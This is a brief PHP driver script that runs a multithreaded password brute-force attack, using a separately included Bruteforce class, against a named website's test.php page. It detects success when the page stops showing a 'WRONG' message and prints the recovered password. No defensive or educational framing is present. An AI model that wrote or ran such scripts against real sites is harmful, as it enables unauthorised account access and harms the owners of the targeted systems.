<?php

require_once 'Bruteforce.php';

use Bruteforce\Bruteforce;

$start = microtime(true);

$url = 'http://www.rollshop.co.il/test.php';
$wrongPattern = 'WRONG =(';

$Bruteforce = new Bruteforce($url, $wrongPattern);
$Bruteforce->setThreadsAmount(35);
$Bruteforce->start();

echo 'Password: ' . $Bruteforce->result . '<br>';
echo 'Answer: ' . $Bruteforce->answer;
echo '<hr>';
echo 'Execution time: ' . round((microtime(true) - $start) / 60, 2) . ' min';
